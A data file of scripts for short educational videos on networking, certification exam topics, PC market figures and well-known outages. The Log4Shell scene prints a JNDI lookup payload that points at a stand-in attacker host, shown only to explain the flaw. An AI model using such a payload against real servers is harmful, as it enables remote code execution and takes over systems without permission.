_meta.description: Hand-written topics for the vertical shorts (scripts/shorts-video.cjs). Quizzes come from data/free, cert duels from data/comparisons; everything else is here. One scene = one short sentence: `sub` is shown as a subtitle, `say` (optional) is what the voice reads instead. Every figure needs a `source`.

concepts.question: What is a cookie?
concepts.hook: HTTP forgets you after every single request. So how does a site keep you logged in? Cookies.
concepts.def: A cookie is a small piece of data a website asks your browser to store, then send back with every request to that site.

steps.sub: You log in, and your browser sends your username and password.
The server answers with a Set-Cookie header holding a random session ID.
From then on, the browser attaches that cookie to every request, so the server knows it's you.
That's why a stolen session cookie works like a stolen login. HttpOnly, Secure and SameSite flags protect it.

concepts.examTip: Session hijacking and cookie flags show up on Security+ and CEH.
concepts.examTipSay: Session hijacking and cookie flags show up on Security Plus and C E H.

concepts.hook: Four cables between two switches, but only one carries traffic. Here's how LACP fixes that.
concepts.hookSay: Four cables between two switches, but only one carries traffic. Here's how L A C P fixes that.
concepts.def: LACP bundles several physical links into one logical link, called a port channel or EtherChannel.
concepts.defSay: L A C P bundles several physical links into one logical link, called a port channel, or EtherChannel.

steps.sub: Without it, Spanning Tree blocks the extra cables to prevent loops. Only one link works.
With LACP, both switches exchange LACPDU messages to agree which ports can be bundled.
steps.say: With L A C P, both switches exchange L A C P D U messages to agree which ports can be bundled.

steps.sub: The four links become one logical link: four gigabits, and Spanning Tree sees a single link.
If one cable fails, traffic keeps flowing on the other three. No outage.

concepts.examTip: Exam favorite: active + passive forms a bundle. Passive + passive never does.
concepts.examTipSay: Exam favorite: active plus passive forms a bundle. Passive plus passive never does.

concepts.hook: You type a name. Your computer needs a number. Here's what happens in between.
concepts.def: DNS turns names like certquests.com into the IP addresses computers actually connect to.

steps.sub: Your PC asks a recursive resolver, usually your ISP's or a public one like 1.1.1.1.
steps.say: Your PC asks a recursive resolver, usually your I S P's, or a public one like one dot one dot one dot one.

steps.sub: The resolver asks a root server, which points it to the .com servers.
steps.say: The resolver asks a root server, which points it to the dot com servers.

steps.sub: The .com servers point to the domain's own name servers.
steps.say: The dot com servers point to the domain's own name servers.

steps.sub: Those answer with the A record: the real IP address.
The resolver caches the answer, so the next lookup is instant.

concepts.examTip: Port 53: UDP for most queries, TCP for zone transfers and large answers.
concepts.examTipSay: Port fifty-three: U D P for most queries, T C P for zone transfers and large answers.

concepts.question: What is a VLAN?
concepts.hook: One switch, two departments, and neither should see the other's traffic. That's the job of a VLAN.
concepts.def: A VLAN splits one physical switch into several separate broadcast domains.

steps.sub: Assign ports to VLANs: Finance gets VLAN 10, HR gets VLAN 20.
steps.title: Ports → VLANs

steps.sub: A broadcast from Finance never reaches HR. Less noise, and better isolation.
steps.title: Broadcasts stay inside
steps.text: Each VLAN is its own broadcast domain

steps.sub: Between switches, one trunk link carries every VLAN, each frame tagged with 802.1Q.
steps.say: Between switches, one trunk link carries every VLAN, each frame tagged with eight oh two dot one Q.
steps.title: Trunks carry them all
steps.text: 802.1Q adds a 4-byte tag with the VLAN ID

steps.sub: To talk across VLANs, traffic has to go through a router or a layer 3 switch.
steps.title: Crossing needs layer 3

concepts.examTip: Native VLAN frames cross a trunk untagged. A native VLAN mismatch is a classic CCNA trap.
concepts.examTipSay: Native VLAN frames cross a trunk untagged. A native VLAN mismatch is a classic C C N A trap.

tops.title: 5 tools every ethical hacker learns first
tops.hook: Want to get into ethical hacking? These are the five tools you'll meet in every lab.

items.name: Hashcat
items.line: Cracks password hashes on your GPU, to prove weak passwords fall fast.

items.name: Metasploit
items.line: A huge library of exploits and payloads to validate a vulnerability safely.

items.name: Burp Suite
items.line: Sits between your browser and a site to intercept and tamper with every request.

items.name: Wireshark
items.line: Captures network traffic so you see exactly what's on the wire.

items.name: Nmap
items.line: Maps hosts, open ports and services: step one of almost every pentest.

tops.warning: Only use them on systems you own or have written permission to test.
tops.outro: You'll meet all five on PenTest+ and CEH.
tops.outroSay: You'll meet all five on PenTest Plus and C E H.

tops.title: Who sells the most PCs? (Q3 2026)
tops.hook: Who sells the most PCs in the world right now? Here's IDC's latest ranking.

items.name: ASUS
items.line: 5.5 million PCs. The smallest drop of the top five: down 8.6%.

items.name: Apple
items.line: 5.9 million Macs. Share up from 8.5% a year ago.

items.name: Dell
items.line: 7.6 million PCs shipped in the quarter.

items.name: HP
items.line: 10.3 million PCs, but the steepest fall: down 30.9%.

items.name: Lenovo
items.line: Number one again, with 14.9 million PCs.

tops.outro: The whole market fell 20.1%, to 62.7 million PCs.
tops.source: Source: IDC, preliminary Q3 2026 PC shipments (Oct 2026)

tops.title: 5 free tools every SOC analyst should know
tops.hook: Defending beats hacking on the job market. Here are five free tools SOC analysts use every day.

items.name: CyberChef
items.line: Decodes and transforms suspicious data in your browser. Built by GCHQ.

items.name: Velociraptor
items.line: Collects forensic evidence from thousands of endpoints at once.

items.name: Suricata
items.line: Inspects network traffic in real time and alerts on attack signatures.

items.name: Sysmon
items.line: Logs process launches and network connections into the Windows event log.

items.name: Wazuh
items.line: Collects logs from your machines, detects threats and flags misconfigurations.

tops.outro: These are the skills CySA+ and SC-200 test.
tops.outroSay: These are the skills Cy S A Plus and S C two hundred test.

incidents.title: The update that crashed 8.5 million PCs
incidents.hook: July 19, 2024. One software update crashes 8.5 million Windows PCs. Flights, hospitals and banks go down.

beats.label: What happened
beats.sub: CrowdStrike pushed a routine content update to its Falcon sensor, which runs deep inside the Windows kernel.

beats.label: Why it crashed
beats.sub: The update expected 21 input fields, but the sensor supplied only 20. Reading the missing one crashed Windows on every boot.

beats.label: The fix
beats.sub: The file was pulled after 78 minutes, but stuck machines needed someone to delete it by hand, often in Safe Mode.

impact.label: Windows devices crashed
impact.sub: Microsoft's estimate: 8.5 million devices, less than one percent of all Windows machines.

incidents.lesson: The lesson: stage your rollouts. A few machines first, then everyone.
incidents.source: Sources: CrowdStrike root cause analysis (Aug 2024), Microsoft (Jul 2024)

incidents.title: How Facebook erased itself from the internet
incidents.hook: October 4, 2021. Facebook, Instagram and WhatsApp vanish from the internet for nearly six hours.

beats.label: The command
beats.sub: A routine command to check backbone capacity accidentally cut Facebook's whole backbone. The audit tool meant to stop it had a bug.

beats.label: The domino
beats.sub: Facebook's DNS servers lost the data centers and withdrew their BGP routes. Nobody could resolve facebook.com.
beats.say: Facebook's DNS servers lost the data centers, and withdrew their B G P routes. Nobody could resolve facebook dot com.

beats.label: The fix
beats.sub: With remote tools down too, engineers had to get into the data centers in person to bring the network back.

impact.label: Facebook, Instagram, WhatsApp offline
impact.sub: Nearly six hours offline, for billions of users.

incidents.lesson: The lesson: keep out-of-band access. Never let your repair path depend on the network you're repairing.

incidents.title: Log4Shell: one line of text, millions of servers
incidents.hook: December 2021. A single line of text can take over millions of servers. They call it Log4Shell.
incidents.hookSay: December 2021. A single line of text can take over millions of servers. They call it Log for Shell.

beats.label: The flaw
beats.sub: Log4j, a hugely popular Java logging library, resolved special lookups inside log messages, even remote ones.
beats.say: Log for J, a hugely popular Java logging library, resolved special lookups inside log messages, even remote ones.

beats.label: The exploit
beats.sub: Get a string like ${jndi:ldap://attacker.example/x} logged, in a chat message or a header, and the server fetched and ran the attacker's code.
beats.say: Get one special lookup string logged, in a chat message or a header, and the server fetched and ran the attacker's code.

beats.label: The scramble
beats.sub: Teams spent weeks hunting Log4j inside apps they didn't even know used it.
beats.say: Teams spent weeks hunting Log for J inside apps they didn't even know used it.

impact.label: CVSS score: the maximum
impact.sub: CVE-2021-44228 scored 10 out of 10, the maximum severity.
impact.say: It scored ten out of ten, the maximum severity.

incidents.lesson: The lesson: know your dependencies. A software bill of materials finds a vulnerable library in minutes.

incidents.title: The engineer who deleted production
incidents.hook: January 31, 2017. An engineer at GitLab runs one command on the wrong server, and 300 gigabytes of production data are gone.

beats.label: The mistake
beats.sub: Fighting replication lag late at night, he ran rm -rf on what he thought was the secondary database. It was the primary.
beats.say: Fighting replication lag late at night, he ran r m, dash r f, on what he thought was the secondary database. It was the primary.

beats.label: The backups
beats.sub: GitLab had five backup and recovery mechanisms. Not one of them could bring the data back.

beats.label: The recovery
beats.sub: They restored a staging snapshot taken six hours earlier, and livestreamed the whole recovery on YouTube.

impact.label: of user data lost
impact.sub: About six hours of issues, merge requests and comments were lost for good.

incidents.lesson: The lesson: a backup you've never restored is not a backup.

news.title: Why PC sales fell 20% in 2026
news.hook: PC shipments fell 20 percent in a single year. Here's what's going on.

facts.label: PC shipments, Q3 2026 vs Q3 2025
facts.sub: IDC counted 62.7 million PCs shipped last quarter, down 20.1 percent in a year.

facts.label: Buyers stocked up early
facts.sub: Companies and shoppers bought ahead in the first half of the year, before prices climbed.

facts.label: Memory is scarce
facts.sub: And memory is scarce and expensive, as AI data centers soak up the chips.

news.takeaway: IDC expects PC prices to stay far above last year's. Planning a refresh? Budget for it.
news.source: Source: IDC, preliminary Q3 2026 PC shipments (Oct 2026)
